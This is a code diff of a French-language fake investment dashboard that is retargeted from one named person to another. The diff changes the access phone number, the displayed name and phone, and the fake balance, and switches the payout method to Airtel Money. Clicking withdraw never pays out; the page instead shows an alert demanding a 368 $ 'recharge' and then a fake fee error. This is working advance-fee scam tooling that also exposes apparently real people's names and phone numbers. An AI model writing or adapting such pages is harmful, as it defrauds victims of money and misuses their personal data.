@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0895975479") {
+        if (code === "0973519891") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -245,10 +245,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 390 $</span>
+                <span class="balance">Solde: 1 770 $</span>
                 <div class="account-info">
-                    <span id="user-name">Consolation Kahilu</span><br>
-                    <span id="user-phone">+243 089 597 5479</span>
+                    <span id="user-name">Katembo Katsuva Patric</span><br>
+                    <span id="user-phone">+243 097 351 9891</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -277,7 +277,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Orange Money</button>
+                <button id="orange-money">Retirer via Airtel Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -310,17 +310,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "Consolation Kahilu";
-                const accountNumber = "+243 089 597 5479";
-                const balance = "350 $";
+                const accountName = "Katembo Katsuva Patric";
+                const accountNumber = "+243 097 351 9891";
+                const balance = "1 770 $";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via orange money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Airtel money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("orange money");
+                    setWithdrawalInfo("Airtel money");
                 }
             });
 
@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher Kahilu, Veuillez payer les frais de carte d\'investisseur afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Katembo, Veuillez recharger votre compte d\'un montant de 368 $ afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Frais de tva néccéssaire.';
+                errorMessage.textContent = 'Erreur : Frais néccéssaire.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
